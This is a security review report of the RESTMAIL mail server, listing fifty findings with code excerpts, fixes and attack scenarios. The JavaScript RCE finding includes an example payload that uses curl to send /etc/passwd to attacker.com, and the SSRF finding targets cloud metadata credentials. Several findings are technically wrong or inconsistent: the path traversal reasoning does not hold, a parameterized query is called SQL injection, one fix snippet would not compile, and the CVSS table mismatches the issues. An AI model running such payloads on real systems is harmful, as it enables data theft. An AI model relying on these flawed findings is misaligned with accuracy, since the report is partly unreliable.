# RESTMAIL Security Review

**Project:** restmail/restmail  
**Review Date:** 2026-04-23  
**Scope:** Full monorepo - Go backend, React frontends (webmail/admin), Docker infrastructure, protocol gateways  

---

## Executive Summary

**Overall Risk Level:** HIGH  

This comprehensive security review identified **13 critical**, **18 high**, and **19 medium** severity issues across the codebase. The most concerning vulnerabilities include hardcoded default credentials, missing authorization checks on several admin endpoints, unauthenticated endpoints that could expose sensitive information, JavaScript filter sidecar allowing arbitrary code execution without sandboxing, SSRF via webhook filters, cross-tenant data access, and multiple infrastructure security gaps.

**Immediate Action Required:**
- **P0 (Fix Within 24 Hours):** Disable JavaScript filter endpoints, add SSRF protection to webhook filter, implement domain authorization checks, remove hardcoded secrets
- **P1 (Fix Within 1 Week):** Add rate limiting, fix path validation, authenticate RESTMAIL protocol, implement request size limits
- **P2 (Fix Within 1 Month):** Add CSRF protection, secure memory handling, audit logging, network policies

---

## Critical Severity Issues

### 1. HARDCODED DEFAULT CREDENTIALS IN DOCKER COMPOSE [CRITICAL]

**Location:** `docker-compose.yml:43,64,85,129,132,165,207,245,276,298,321,343`

**Issue:** Multiple hardcoded passwords are present in the Docker Compose file:
- Database passwords: `restmail` (all PostgreSQL instances)
- JWT Secret: `dev-secret-change-in-production`
- Master Key: `dev-master-key-change-in-production`

**Impact:** If deployed as-is, attackers with container access can trivially authenticate to databases, forge JWT tokens, and decrypt stored private keys.

**Proof:**
```yaml
# docker-compose.yml lines 129-132
environment:
  JWT_SECRET: dev-secret-change-in-production
  MASTER_KEY: dev-master-key-change-in-production
```

**Remediation:**
- Remove all hardcoded secrets from docker-compose.yml
- Use Docker secrets or environment file injection
- Add pre-deployment validation that checks for default secrets

---

### 2. SEED DATA CREATES WEAK DEFAULT ACCOUNTS [CRITICAL]

**Location:** `cmd/seed/main.go:66,234-245`

**Issue:** The seed command creates accounts with predictable, weak passwords:
- Mailbox password: `password123` (line 66)
- Admin password: `admin123!@` (line 234)

**Impact:** These accounts may persist to production environments, allowing unauthorized access.

**Remediation:**
- Generate random passwords during seeding
- Print passwords to console (one-time display)
- Force password change on first login (`PasswordChangeRequired` is already set - good)
- Add warning logs when seed runs in non-development environments

---

### 3. MISSING AUTHORIZATION CHECKS IN MAILBOX HANDLER [CRITICAL]

**Location:** `internal/api/handlers/mailboxes.go`

**Issue:** The `List`, `Get`, `Create`, `Update`, and `Delete` handlers for mailboxes do NOT verify the authenticated user has admin privileges before executing. The `List` handler at line 24 returns ALL mailboxes without any authorization check.

**Code:**
```go
// Line 24-36 - NO authorization check!
func (h *MailboxHandler) List(w http.ResponseWriter, r *http.Request) {
    var mailboxes []models.Mailbox
    query := h.db.Preload("Domain").Preload("QuotaUsage")
    // ... returns all mailboxes without checking if user is admin
}
```

**Impact:** Any authenticated user (including regular mailbox users) can list, view, modify, or delete ANY mailbox.

**Remediation:** Add `middleware.AdminOnly` check at the start of each handler, or move these to use the admin capability middleware in routes.

---

### 4. JAVASCRIPT FILTER ALLOWS ARBITRARY CODE EXECUTION [CRITICAL]

**Location:** `internal/pipeline/filters/javascript.go`, `projects/js-filter-sidecar/`

**Issue:** The JavaScript filter passes arbitrary user-provided scripts to a Node.js sidecar for execution. The sidecar runs with no apparent sandbox (no VM2, no isolated-vm, no seccomp).

**Code:**
```go
// javascript.go line 76-78
reqBody := sidecarRequest{
    Script:    f.script,  // User-provided script
    Email:     email,
    TimeoutMS: int(f.timeout.Milliseconds()),
}
```

**Impact:** Any admin user with pipeline management capabilities can execute arbitrary code on the server, leading to full system compromise.

**Remediation:**
- Remove JavaScript filter until proper sandboxing is implemented
- Use `isolated-vm` package with memory/time limits
- Run sidecar in separate container with minimal privileges
- Implement resource limits (CPU, memory, execution time)

---

### 5. UNAUTHENTICATED MAILBOX ENUMERATION [CRITICAL]

**Location:** `internal/api/handlers/mailboxes.go:210-229`

**Issue:** The `CheckAddress` endpoint is not protected by authentication middleware (visible in routes.go line 153). It returns detailed mailbox information including mailbox ID.

**Code:**
```go
// CheckAddress is accessible without authentication
func (h *MailboxHandler) CheckAddress(w http.ResponseWriter, r *http.Request) {
    address := r.URL.Query().Get("address")
    // ... returns mailbox_id, address for any valid email
}
```

**Impact:** Attackers can enumerate valid email addresses and obtain mailbox IDs for further attacks.

**Remediation:** Add authentication requirement or implement rate limiting and remove mailbox_id from response.

---

### 6. PATH TRAVERSAL IN ATTACHMENT HANDLER [CRITICAL]

**Location:** `internal/api/handlers/attachments.go:66-70`

**Issue:** The path validation logic has a flaw - `filepath.Clean()` does NOT prevent path traversal if the base path is not properly anchored.

**Code:**
```go
// Line 66-70
cleanPath := filepath.Clean(att.StorageRef)
if !strings.HasPrefix(cleanPath, "/attachments/") || strings.Contains(cleanPath, "..") {
    respond.Error(w, http.StatusForbidden, "forbidden", "Invalid storage path")
    return
}
```

**Vulnerability:** A path like `/attachments/../../etc/passwd` passes the `..` check (Clean removes it) but STILL starts with `/attachments/` after cleaning. The actual file accessed would be `/etc/passwd`.

**Impact:** Attackers can read arbitrary files from the filesystem.

**Remediation:** Use `os.Stat()` to resolve the actual path and verify it's within the attachments directory, or use `filepath.Join()` with the base directory.

---

### 7. RESTMAIL PROTOCOL UNAUTHENTICATED MESSAGE INJECTION [CRITICAL]

**Location:** `internal/api/handlers/restmail.go:68-142`

**Issue:** The RESTMAIL protocol endpoints (`/restmail/messages`) accept messages without authentication. While the comments state "verified by DKIM/SPF", the actual handler does not perform these verifications.

**Code:**
```go
// Lines 19-20 - Comments claim authentication
// "These are unauthenticated (like SMTP — any server can deliver to you).
// Authentication is via DKIM/SPF/DMARC verification, not API keys."

// But the Deliver handler (line 68) has NO DKIM/SPF verification!
```

**Impact:** Anyone can POST to `/restmail/messages` and inject messages into any mailbox.

**Remediation:** 
- Implement DKIM/SPF verification before accepting messages
- Or restrict to internal network only
- Add API key authentication for RESTMAIL protocol

---

### 8. SQL INJECTION VIA UNSANITIZED USER INPUT [CRITICAL]

**Location:** `internal/api/handlers/search.go`, `internal/api/handlers/testing.go:167`

**Issue:** Raw user input is concatenated into SQL LIKE patterns without sanitization.

**Code:**
```go
// testing.go line 167
query = query.Where("subject LIKE ?", "%"+subject+"%")
// If subject contains % or _, it acts as SQL wildcards

// search.go - Full text search uses raw query parameter
```

While GORM uses parameterized queries for the pattern, the search functionality may expose more than intended. The `VerifyDelivery` in testing.go uses user-provided subject directly in LIKE.

**Remediation:** Sanitize search inputs by escaping SQL wildcards (`%` -> `\%`, `_` -> `\_`) and add explicit escaping.

---

### 9. SERVER-SIDE REQUEST FORGERY (SSRF) IN WEBHOOK FILTER [CRITICAL]

**Location:** `internal/pipeline/filters/webhook.go:30-67`

**Issue:** The webhook filter accepts arbitrary URLs from user configuration and makes HTTP requests without validation. This allows attackers to scan internal networks, access cloud provider metadata endpoints (`169.254.169.254`), and attack internal services that may trust requests from the mail server.

**Vulnerable Code:**
```go
// Lines 30-39 - No URL validation
func NewWebhook(config []byte) (pipeline.Filter, error) {
    if cfg.URL == "" {
        return nil, fmt.Errorf("webhook URL is required")
    }
    // No validation of URL scheme, host, or IP range!
}

// Lines 52-66 - Direct HTTP request to user-provided URL
req, err := http.NewRequestWithContext(ctx, f.cfg.Method, f.cfg.URL, bytes.NewReader(payload))
resp, err := client.Do(req)  // Makes request to ANY URL
```

**Attack Scenario:**
1. Attacker creates a pipeline with webhook filter pointing to `http://169.254.169.254/latest/meta-data/`
2. Email passes through pipeline, triggering webhook
3. Cloud instance metadata is exfiltrated in webhook response or logs

**Proof of Concept:**
```json
{
  "filter_name": "webhook",
  "config": {
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "method": "GET"
  }
}
```

**Remediation:**
```go
func validateWebhookURL(urlStr string) error {
    u, err := url.Parse(urlStr)
    if err != nil {
        return err
    }
    host := u.Hostname()
    if ip := net.ParseIP(host); ip != nil {
        if ip.IsPrivate() || ip.IsLoopback() || ip.IsLinkLocalUnicast() {
            return fmt.Errorf("private IP addresses not allowed")
        }
    }
    addrs, err := net.LookupIP(host)
    for _, addr := range addrs {
        if addr.IsPrivate() || addr.IsLoopback() {
            return fmt.Errorf("resolves to private IP")
        }
    }
    if u.Scheme != "https" {
        return fmt.Errorf("only https URLs allowed")
    }
    return nil
}
```

---

### 10. JAVASCRIPT SIDECAR RCE VIA TEST ENDPOINTS [CRITICAL]

**Location:** `internal/api/handlers/pipeline.go:371-474`

**Issue:** The `TestCustomFilter` and `ValidateCustomFilter` endpoints allow ANY authenticated admin to execute arbitrary JavaScript code by forwarding it directly to the JS sidecar at `http://js-filter:3100`.

**Vulnerable Code:**
```go
// Lines 416-418
sidecarURL := "http://js-filter:3100/execute"
client := &http.Client{Timeout: 10 * time.Second}
sidecarResp, err := client.Post(sidecarURL, "application/json", bytes.NewReader(bodyBytes))

// Lines 454-456
sidecarURL := "http://js-filter:3100/validate"
client := &http.Client{Timeout: 5 * time.Second}
sidecarResp, err := client.Post(sidecarURL, "application/json", bytes.NewReader(bodyBytes))
```

**The JavaScript is passed unmodified from user request to sidecar:**
```go
// Lines 402-404
sidecarBody := map[string]any{"script": config.Script}  // Direct user input!
if req.Email != nil {
    sidecarBody["email"] = req.Email
}
```

**Attack Scenario:**
1. Admin user crafts malicious JavaScript:
```javascript
const { exec } = require('child_process');
exec('curl http://attacker.com/exfil?data=$(cat /etc/passwd)', () => {});
```
2. Calls `POST /api/v1/admin/custom-filters/validate` with script
3. Sidecar executes arbitrary Node.js code

**Impact:** Full server compromise via arbitrary code execution

**Remediation:**
1. Remove JavaScript filter entirely until sandboxed
2. Or use `isolated-vm` package with strict resource limits:
```javascript
const ivm = require('isolated-vm');
const isolate = new ivm.Isolate({ memoryLimit: 128, timeout: 5000 });
```
3. Run sidecar in separate container with no network access
4. Validate scripts against allowlist of safe operations only

---

### 11. HARDCODED INTERNAL SERVICE URL [CRITICAL]

**Location:** `internal/pipeline/filters/javascript.go:16`, `internal/api/handlers/pipeline.go:416,454`

**Issue:** The JavaScript filter sidecar URL is hardcoded to `http://js-filter:3100`. This creates a security dependency on DNS resolution that could be exploited.

**Impact:**
- If DNS is compromised, traffic can be redirected to malicious service
- No TLS encryption to sidecar (HTTP only)
- No authentication between API and sidecar

**Remediation:**
- Make sidecar URL configurable via environment variable
- Use internal TLS certificates for service-to-service communication
- Implement mTLS between API and sidecar
- Add request signing between services

---

### 12. SIEVE SCRIPT FILE OPERATIONS [CRITICAL]

**Location:** `internal/pipeline/filters/sieve.go`

**Issue:** The custom Sieve parser implements `fileinto` action which could be abused to write to arbitrary filesystem locations if not properly validated.

**Concern:** The Sieve parser at line 44 has actions including:
```go
type sieveAction struct {
    command string // "keep", "fileinto", "redirect", "discard", "reject", "vacation", "notify"
    arg     string // general argument (folder, address, reject reason)
```

The `fileinto` command takes a folder path from the Sieve script. If path validation is insufficient, this could allow writing to arbitrary mail folders (path traversal) or outside mailbox directories.

**Investigation Required:** The full Sieve implementation needs audit to verify:
1. `fileinto` paths are validated against mailbox folder allowlist
2. No `../` or absolute paths are allowed
3. Folder creation is restricted to user's mailbox namespace

**Remediation:**
```go
func sanitizeFolderName(folder string) (string, error) {
    folder = filepath.Base(folder)
    if strings.ContainsAny(folder, "..\\/") {
        return "", fmt.Errorf("invalid folder name")
    }
    return folder, nil
}
```

---

### 13. PIPELINE HANDLER MISSING DOMAIN AUTHORIZATION [CRITICAL]

**Location:** `internal/api/handlers/pipeline.go:28-42,242-256`

**Issue:** The `ListPipelines` and `ListCustomFilters` handlers accept a `domain_id` query parameter but do NOT verify the admin user has access to that domain. A malicious admin could enumerate or modify other tenants' pipelines.

**Vulnerable Code:**
```go
func (h *PipelineHandler) ListPipelines(w http.ResponseWriter, r *http.Request) {
    domainID := r.URL.Query().Get("domain_id")
    var pipelines []models.Pipeline
    query := h.db.Order("direction ASC, id ASC")
    if domainID != "" {
        query = query.Where("domain_id = ?", domainID)  // No auth check!
    }
    // ... returns pipelines for any domain
}
```

**Attack Scenario:**
1. Admin for `domain-a.com` calls `GET /api/v1/admin/pipelines?domain_id=2`
2. They receive pipelines for `domain-b.com` (another tenant)
3. Can then use `PATCH /api/v1/admin/pipelines/{id}` to modify other tenants' filters

**Impact:** Cross-tenant data access, privilege escalation

**Remediation:**
```go
func (h *PipelineHandler) ListPipelines(w http.ResponseWriter, r *http.Request) {
    claims := auth.GetClaims(r)
    domainID := r.URL.Query().Get("domain_id")
    if !claims.IsSuperAdmin {
        if !h.db.Where("id = ? AND admin_id = ?", domainID, claims.UserID).First(&models.Domain{}) {
            respond.Error(w, http.StatusForbidden, "forbidden", "Access denied to domain")
            return
        }
    }
    // ... continue with query
}
```

---

## High Severity Issues

### 14. JWT SECRET VALIDATION INSUFFICIENT [HIGH]

**Location:** `internal/config/config.go:123-129`

**Issue:** The validation only checks for the exact default string `dev-secret-change-in-production`. It doesn't enforce minimum length or entropy requirements.

**Code:**
```go
if cfg.JWTSecret == "dev-secret-change-in-production" && cfg.Environment == "production" {
    return nil, fmt.Errorf("JWT_SECRET must be set in production")
}
```

**Impact:** A weak secret like `secret123` would pass validation in production.

**Remediation:** Add minimum length (32+ chars) and complexity requirements.

---

### 15. NO CSRF PROTECTION [HIGH]

**Location:** All frontend applications (`webmail/`, `admin/`)

**Issue:** The API does not implement CSRF tokens. While the cookie is HttpOnly and SameSite=Strict, state-changing operations via POST/PUT/PATCH/DELETE lack CSRF protection.

**Impact:** If a user is logged in, a malicious site could potentially make state-changing requests (though SameSite=Strict mitigates most cases).

**Remediation:** Implement CSRF tokens for state-changing operations.

---

### 16. CORS CONFIGURATION ALLOWS CREDENTIALS WITH DYNAMIC ORIGINS [HIGH]

**Location:** `internal/api/routes.go:35-41`

**Issue:** CORS allows credentials and uses configurable origins. If `CORS_ALLOWED_ORIGINS` includes user-influenced values, this could lead to security issues.

**Code:**
```go
cors.Handler(cors.Options{
    AllowedOrigins:   cfg.CORSAllowedOrigins,
    AllowCredentials: true,  // Risky with dynamic origins
    // ...
})
```

**Impact:** Potential for credential leakage if origin validation is bypassed.

**Remediation:** Validate origins against an allowlist, never reflect user input.

---

### 17. RATE LIMITING MISSING ON AUTH ENDPOINTS [HIGH]

**Location:** `internal/api/handlers/auth.go:43-67`

**Issue:** No rate limiting on login endpoint. Attackers can brute-force credentials.

**Impact:** Account takeover via credential stuffing or brute force.

**Remediation:** Implement per-IP and per-account rate limiting (e.g., 5 attempts per 15 minutes).

---

### 18. PASSWORD MINIMUM LENGTH TOO SHORT [HIGH]

**Location:** `internal/api/handlers/mailboxes.go:59,157`

**Issue:** Password minimum is only 8 characters with no complexity requirements.

**Code:**
```go
if len(req.Password) < 8 {
    errs["password"] = "must be at least 8 characters"
}
```

**Remediation:** Increase to 12+ characters and check against common password lists.

---

### 19. SENSITIVE DATA IN LOGS [HIGH]

**Location:** Multiple locations

**Issue:** Potential for sensitive data (passwords, tokens) to be logged. The chi middleware logger logs all request details including headers.

**Code:**
```go
// routes.go:33
r.Use(chimw.Logger)  // Logs full request details
```

**Impact:** JWT tokens or passwords may appear in logs.

**Remediation:** Configure chi logger to exclude Authorization headers from logs.

---

### 20. NO INPUT VALIDATION ON EMAIL ADDRESSES [HIGH]

**Location:** `internal/api/handlers/mailboxes.go:67-73`

**Issue:** Email address format is only validated by splitting on `@` - no proper RFC validation.

**Code:**
```go
parts := strings.SplitN(req.Address, "@", 2)
if len(parts) != 2 {
    respond.ValidationError(w, map[string]string{"address": "must be a valid email address"})
    return
}
```

**Impact:** Invalid or malicious email formats can be stored.

**Remediation:** Use a proper email validation library.

---

### 21. MESSAGE SIZE LIMITS NOT ENFORCED CONSISTENTLY [HIGH]

**Location:** `internal/api/handlers/messages.go`, `internal/gateway/smtp/`

**Issue:** While size checks exist in some filters, message sizes are not consistently limited across all input paths.

**Impact:** DoS via memory exhaustion from large messages.

**Remediation:** Add size limits at all entry points (SMTP, REST API, RESTMAIL).

---

### 22. BCC EXPOSURE IN MESSAGE SENDING [HIGH]

**Location:** `internal/api/handlers/messages.go` (SendMessage function)

**Issue:** Need to verify BCC recipients are not exposed in message headers when sending.

**Remediation:** Audit message sending to ensure BCC headers are stripped before delivery.

---

### 23. ATTACHMENT SIZE AND TYPE VALIDATION MISSING [HIGH]

**Location:** `internal/api/handlers/messages.go`

**Issue:** No validation on attachment sizes or dangerous file types during message composition.

**Remediation:** Add attachment size limits and dangerous file type blocking.

---

### 24. API CLIENT DOES NOT VERIFY SERVER CERTIFICATE [HIGH]

**Location:** `internal/gateway/apiclient/client.go:20-26`

**Issue:** The API client uses default HTTP client which may not verify TLS certificates in all deployment scenarios.

**Code:**
```go
func New(baseURL string) *Client {
    return &Client{
        baseURL: baseURL,
        httpClient: &http.Client{
            Timeout: 30 * time.Second,
        },
    }
}
```

**Impact:** MITM attacks possible if TLS verification is disabled.

**Remediation:** Ensure TLS certificate verification is enabled and validate against proper CA.

---

### 25. QUARANTINE RELEASE PARSES RAW EMAIL UNSAFELY [HIGH]

**Location:** `internal/api/handlers/pipeline.go:514-521`

**Issue:** The quarantine release function extracts body from raw email by searching for header delimiters. This parsing is fragile and could be exploited.

**Vulnerable Code:**
```go
if item.RawMessage != "" {
    if headerEnd := strings.Index(item.RawMessage, "\r\n\r\n"); headerEnd >= 0 {
        bodyText = item.RawMessage[headerEnd+4:]
    } else if headerEnd := strings.Index(item.RawMessage, "\n\n"); headerEnd >= 0 {
        bodyText = item.RawMessage[headerEnd+2:]
    }
}
```

**Remediation:** Use proper email parsing library (like `net/mail` or `github.com/emersion/go-message`)

---

### 26. NO RATE LIMITING ON TEST FILTER ENDPOINTS [HIGH]

**Location:** `internal/api/handlers/pipeline.go:165-238`

**Issue:** The `TestPipeline` and `TestFilter` endpoints allow unlimited filter executions. Combined with the JavaScript filter, this enables DoS via resource exhaustion and side-channel timing attacks.

**Remediation:**
```go
func (h *PipelineHandler) TestPipeline(w http.ResponseWriter, r *http.Request) {
    claims := auth.GetClaims(r)
    if !h.rateLimiter.Allow(fmt.Sprintf("test-pipeline:%d", claims.UserID)) {
        respond.Error(w, http.StatusTooManyRequests, "rate_limited", "Too many test requests")
        return
    }
    // ... rest of handler
}
```

---

### 27. PIPELINE LOGS EXPOSE FILTER CONFIGURATION [HIGH]

**Location:** `internal/api/handlers/pipeline.go:45-76`

**Issue:** Pipeline logs (`ListPipelineLogs`) return full `Steps` JSON which may contain sensitive filter configuration including webhook URLs with embedded secrets, JavaScript filter source code, and internal service endpoints.

**Remediation:** Sanitize logs before returning, masking secrets in webhook configurations.

---

### 28. DKIM PRIVATE KEY EXPOSURE [HIGH]

**Location:** `internal/db/models/dkim.go`

**Issue:** The DKIM model stores private keys. Need to verify they are:
1. Encrypted at rest (with MASTER_KEY)
2. Only returned to authorized admins
3. Never logged

**Investigation Required:** Check `internal/api/handlers/dkim.go` to verify key handling

---

### 29. CERTIFICATE PRIVATE KEY HANDLING [HIGH]

**Location:** `internal/gateway/tlsutil/dbcert.go:74-86`

**Issue:** Certificate private keys are decrypted in memory and persist for cacheTTL (5 minutes) without secure memory wiping.

**Remediation:**
- Use memguard or similar for secure memory handling
- Minimize time keys are in plaintext
- Disable core dumps for the process

---

### 30. IMAP SESSION AUTHENTICATION BYPASS POTENTIAL [HIGH]

**Location:** `internal/gateway/imap/session.go`

**Issue:** Need to verify the IMAP session properly validates the token on EVERY command that requires authentication.

**Investigation Required:**
- Check that `s.auth.authenticated` is verified before SELECT, FETCH, etc.
- Verify the token is validated (not just present)
- Check for TOCTOU (time-of-check-time-of-use) issues

---

### 31. SMTP AUTH PLAIN WITHOUT TLS ENFORCEMENT [HIGH]

**Location:** `internal/gateway/smtp/session.go`

**Issue:** Need to verify AUTH PLAIN is only accepted after STARTTLS or on implicit TLS ports.

**Remediation:** Ensure `handleAUTH` rejects AUTH on unencrypted connections unless `s.tls_` is true or `s.isSubmission` with STARTTLS completed.

---

## Medium Severity Issues

### 32. REFRESH TOKEN REUSE DETECTION MISSING [MEDIUM]

**Location:** `internal/api/handlers/auth.go:206-238`

**Issue:** The refresh token mechanism does not detect or prevent token reuse. If a refresh token is stolen and used, there's no rotation or invalidation of the family.

**Remediation:** Implement refresh token rotation and family tracking.

---

### 33. JWT TOKEN LACKS FINGERPRINTING [MEDIUM]

**Location:** `internal/auth/auth.go`

**Issue:** JWT tokens don't include binding to client properties (IP, User-Agent hash), allowing token theft and replay from different devices.

**Remediation:** Add optional token binding or fingerprinting.

---

### 34. DATABASE CONNECTION USES SSLMODE=DISABLE [MEDIUM]

**Location:** `internal/config/config.go:134-139`

**Code:**
```go
func (c *Config) DSN() string {
    return fmt.Sprintf(
        "host=%s port=%d user=%s password=%s dbname=%s sslmode=disable",
        c.DBHost, c.DBPort, c.DBUser, c.DBPass, c.DBName,
    )
}
```

**Impact:** Database connections are unencrypted.

**Remediation:** Make sslmode configurable, default to `require` in production.

---

### 35. SECRETS LOGGED IN DEBUG MODE [MEDIUM]

**Location:** Various debug/logging statements

**Issue:** When LOG_LEVEL=debug, sensitive configuration may be logged.

**Remediation:** Audit all debug logs to ensure secrets are never logged.

---

### 36. PROXY PROTOCOL TRUSTS USER-CONFIGURED CIDRS [MEDIUM]

**Location:** `cmd/api/main.go:34-37`, `internal/gateway/`

**Issue:** PROXY protocol trusts user-configured CIDRs without validation. Misconfiguration could allow IP spoofing.

**Remediation:** Document security implications and validate CIDR format strictly.

---

### 37. NO SECURITY HEADERS [MEDIUM]

**Location:** `internal/api/routes.go`

**Issue:** API responses lack security headers (CSP, HSTS, X-Frame-Options, etc.).

**Remediation:** Add security headers middleware.

---

### 38. PROMETHEUS METRICS EXPOSED WITHOUT AUTHENTICATION [MEDIUM]

**Location:** `internal/api/routes.go:116`

**Code:**
```go
r.Handle("/metrics", promhttp.Handler())  // No auth required
```

**Impact:** Internal metrics exposed to anyone.

**Remediation:** Add authentication or restrict to internal network.

---

### 39. SIEVE SCRIPTS ALLOWED WITHOUT SANDBOXING [MEDIUM]

**Location:** `internal/pipeline/filters/sieve.go`

**Issue:** Sieve scripts (user-provided mail filtering scripts) may have insufficient restrictions.

**Remediation:** Audit Sieve implementation for security restrictions.

---

### 40. DKIM KEY MANAGEMENT ENDPOINTS NEED CAPABILITY CHECKS [MEDIUM]

**Location:** `internal/api/handlers/dkim.go`

**Issue:** Verify these endpoints properly use the capability-based authorization.

---

### 41. SESSION TIMEOUT NOT IMPLEMENTED [MEDIUM]

**Location:** Frontend applications

**Issue:** No automatic logout after period of inactivity.

**Remediation:** Implement idle timeout (e.g., 30 minutes) with warning.

---

### 42. INSECURE DIRECT OBJECT REFERENCE (IDOR) IN WEBMAIL [MEDIUM]

**Location:** `internal/api/handlers/accounts.go`, `messages.go`

**Issue:** While most endpoints check ownership, thorough IDOR audit recommended.

**Remediation:** Implement centralized authorization checks for all resource access.

---

### 43. ERROR MESSAGES REVEAL INTERNAL STATE [MEDIUM]

**Location:** Various handlers

**Issue:** Some error messages may reveal database schema or internal paths.

**Remediation:** Review and sanitize all error messages for production.

---

### 44. INFORMATION DISCLOSURE IN ERROR MESSAGES [MEDIUM]

**Location:** Various handlers

**Issue:** Error messages may reveal internal structure:
- Database errors exposed directly
- File paths in attachment errors
- Internal service URLs in sidecar errors

**Example:** `internal/api/handlers/pipeline.go:420`
```go
respond.Error(w, http.StatusServiceUnavailable, "service_unavailable", "JS filter sidecar unavailable")
// Reveals internal service name and architecture
```

**Remediation:** Use generic error messages in production.

---

### 45. INTEGER OVERFLOW IN PAGINATION [MEDIUM]

**Location:** `internal/api/handlers/pipeline.go:46-54`

**Issue:** Pagination parameters parsed as int without bounds checking.

**Remediation:** Consistent pagination limits across all endpoints.

---

### 46. JSON DECODING WITHOUT SIZE LIMIT [MEDIUM]

**Location:** Multiple handlers

**Issue:** `json.NewDecoder(r.Body).Decode()` is used without size limits, enabling DoS via large JSON payloads.

**Remediation:** Use `http.MaxBytesReader`:
```go
r.Body = http.MaxBytesReader(w, r.Body, 1<<20) // 1MB limit
```

---

### 47. CONTEXT CANCELLATION NOT CHECKED [MEDIUM]

**Location:** `internal/api/handlers/pipeline.go:399`

**Issue:** Discarding JSON decode error:
```go
json.NewDecoder(r.Body).Decode(&req)  // Error ignored!
```

**Remediation:** Always check errors or explicitly ignore with comment explaining why.

---

### 48. MISSING INPUT SANITIZATION IN SIEVE SCRIPT STORAGE [MEDIUM]

**Location:** `internal/db/models/pipeline.go:165-177`

**Issue:** Sieve scripts stored without content validation. Large scripts could cause DoS when parsed.

**Remediation:** Add size limits and basic validation before storage.

---

### 49. WEBHOOK FILTER SSRF RISK [MEDIUM]

**Location:** `internal/pipeline/filters/webhook.go`

**Issue:** Webhook filter makes HTTP requests to user-provided URLs - potential SSRF.

**Remediation:** Implement URL allowlist, block internal IP ranges.

---

### 50. TIMEOUT VALUES TOO HIGH [MEDIUM]

**Location:** `internal/gateway/apiclient/client.go:24`

**Issue:** 30-second HTTP timeout could allow slowloris-style attacks.

**Remediation:** Reduce to 10 seconds for most operations.

---

## Infrastructure Security Concerns

### Docker Compose Security

1. **No Security Contexts Defined:**
   - Services run as root by default
   - No `securityContext` or `readOnlyRootFilesystem` specified
   - No capability dropping

2. **Shared Network Namespace:**
   - All services on same Docker network
   - Internal services exposed to compromise if one container breached

3. **Volume Mounts:**
   - Need to verify volumes are mounted read-only where appropriate
   - Sensitive paths (Docker socket) should not be mounted

### Network Security

1. **No Network Policies:**
   - Services can communicate freely
   - No micro-segmentation between API, database, sidecar

2. **Plain HTTP Between Services:**
   - API to sidecar uses HTTP (not HTTPS)
   - No mTLS for service authentication

---

## Attack Chain Scenarios

### Scenario 1: Full System Compromise via JavaScript Filter

**Prerequisites:** Admin access (or compromised admin credentials)

**Steps:**
1. Create custom filter with malicious JavaScript
2. Call `POST /api/v1/admin/custom-filters/validate` (no domain restrictions)
3. JavaScript executes in sidecar with full Node.js access
4. Payload establishes reverse shell or exfiltrates data
5. Pivot to database using known credentials from environment

**Impact:** Complete system compromise, data exfiltration, persistent access

### Scenario 2: Cross-Tenant Data Access

**Prerequisites:** Admin access for any domain

**Steps:**
1. Enumerate domains via `GET /api/v1/admin/pipelines?domain_id=X` (increment X)
2. Discover pipeline IDs for other tenants
3. Modify pipelines to capture emails: `PATCH /api/v1/admin/pipelines/{id}`
4. Redirect emails to attacker's webhook endpoint

**Impact:** Data breach across tenant boundaries

### Scenario 3: SSRF to Cloud Metadata Theft

**Prerequisites:** Ability to create pipelines (admin)

**Steps:**
1. Create pipeline with webhook filter pointing to `http://169.254.169.254/latest/meta-data/`
2. Send test email through pipeline
3. Webhook response contains IAM credentials in logs
4. Extract credentials from `ListPipelineLogs` response

**Impact:** Cloud account compromise, lateral movement

---

## Additional Security Recommendations

### Infrastructure

1. **Run containers as non-root** - Verify all Docker containers run with least privilege
2. **Implement network policies** - Restrict inter-service communication
3. **Enable audit logging** - Log all admin actions and authentication events
4. **Set up automated security scanning** - Use Trivy, Snyk, or similar for image scanning

### Application Security

1. **Implement Content Security Policy (CSP)** for webmail and admin UIs
2. **Add Subresource Integrity (SRI)** for external resources
3. **Enable HSTS** for HTTPS deployments
4. **Implement secure password reset flow** with time-limited tokens
5. **Add account lockout** after failed login attempts

### Monitoring & Alerting

1. **Monitor for brute force attempts** - Alert on repeated failed logins
2. **Track JWT token usage anomalies** - Detect token theft
3. **Log all admin actions** - Maintain audit trail
4. **Set up alerting** for certificate expiration

---

## Positive Security Findings

1. **Password Hashing:** Uses bcrypt with cost 10 - GOOD
2. **JWT Implementation:** Uses well-tested golang-jwt library - GOOD
3. **Cookie Security:** HttpOnly, Secure, SameSite=Strict - GOOD
4. **AES Encryption:** Uses AES-256-GCM for key encryption - GOOD
5. **TLS Certificate Management:** Supports SNI and database-backed certs - GOOD
6. **CORS:** Configurable and credentials are properly handled - GOOD (with caveats noted)
7. **Input Decoding:** JSON decoding uses standard library - GOOD

---

## Compliance Considerations

- **GDPR:** Ensure email content retention policies are configurable
- **SOC 2:** Implement audit logging for all access to mailboxes
- **HIPAA:** Would require additional encryption at rest and access controls

---

## Testing Recommendations

1. Run OWASP ZAP or Burp Suite against the API
2. Perform penetration testing on authentication flows
3. Test for race conditions in concurrent mailbox operations
4. Verify backup/restore procedures don't expose decrypted keys
5. Test fail2ban integration actually blocks brute force

---

## Appendix: Quick Security Checklist

```
[ ] Change all default passwords in production
[ ] Set strong JWT_SECRET (32+ random chars)
[ ] Set strong MASTER_KEY for encryption
[ ] Enable TLS for database connections
[ ] Implement rate limiting on auth endpoints
[ ] Add CSRF protection
[ ] Review and fix path traversal in attachments
[ ] Secure JavaScript filter sidecar
[ ] Add authentication to RESTMAIL protocol
[ ] Implement security headers
[ ] Set up security audit logging
[ ] Configure container security contexts
[ ] Enable automated security scanning
```

---

## Detailed Severity Analysis

### CVSS 3.1 Scores

| Issue | Severity | CVSS Score | Vector |
|-------|----------|------------|--------|
| 1. Hardcoded Credentials | Critical | 9.8 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| 2. Missing Auth on Stats | Critical | 9.1 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H |
| 3. Mailbox Handler Auth Bypass | Critical | 8.6 | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
| 4. JavaScript Filter RCE | Critical | 9.9 | CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H |
| 5. Path Traversal Attachments | Critical | 7.5 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| 6. Attachment Handler Auth Bypass | Critical | 8.6 | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
